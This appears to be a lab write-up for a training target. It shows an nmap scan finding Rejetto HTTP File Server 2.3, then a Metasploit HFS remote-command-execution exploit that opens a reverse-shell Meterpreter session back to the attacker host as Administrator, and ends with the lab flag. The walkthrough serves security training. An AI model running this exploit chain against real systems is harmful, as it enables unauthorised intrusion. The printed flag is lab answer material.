## Windows: HTTP File Server

### Target
* `demo.ine.local`

### Tools used:
* `nmap`


### Objective: Exploit the target and find the flag!

---
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 08:50 IST
Nmap scan report for demo.ine.local (10.3.18.25)
Host is up (0.0026s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds

┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -p80 -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 08:50 IST
Nmap scan report for demo.ine.local (10.3.18.25)
Host is up (0.0031s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.32 seconds
```
```bash
┌──(root㉿INE)-[~]
└─# searchsploit HFS | grep Metasploit
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                   | windows/remote/34926.rb
```
```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.48.2:4444 
[*] Using URL: http://10.10.48.2:8080/rrROi1DxSNR7w
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /rrROi1DxSNR7w
[*] Sending stage (176198 bytes) to 10.3.18.25
[!] Tried to delete %TEMP%\qsmjuJMi.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.48.2:4444 -> 10.3.18.25:49316) at 2026-01-25 08:54:08 +0530
[*] Server stopped.

meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```
```bash
C:\hfs>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\hfs

01/25/2026  03:24 AM    <DIR>          .
01/25/2026  03:24 AM    <DIR>          ..
01/25/2026  03:24 AM    <DIR>          %TEMP%
02/16/2014  01:58 PM           760,320 hfs.exe
               1 File(s)        760,320 bytes
               3 Dir(s)   9,115,529,216 bytes free

C:\hfs>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\

09/14/2020  06:52 AM                32 flag.txt
01/25/2026  03:24 AM    <DIR>          hfs
08/22/2013  03:52 PM    <DIR>          PerfLogs
08/12/2020  04:13 AM    <DIR>          Program Files
09/05/2020  09:05 AM    <DIR>          Program Files (x86)
09/10/2020  09:50 AM    <DIR>          Users
01/25/2026  03:18 AM    <DIR>          Windows
               1 File(s)             32 bytes
               6 Dir(s)   9,115,529,216 bytes free
C:\>type flag.txt   
type flag.txt
f74c8347798f4082daf4b4570dba094a
```
Flag: **f74c8347798f4082daf4b4570dba094a**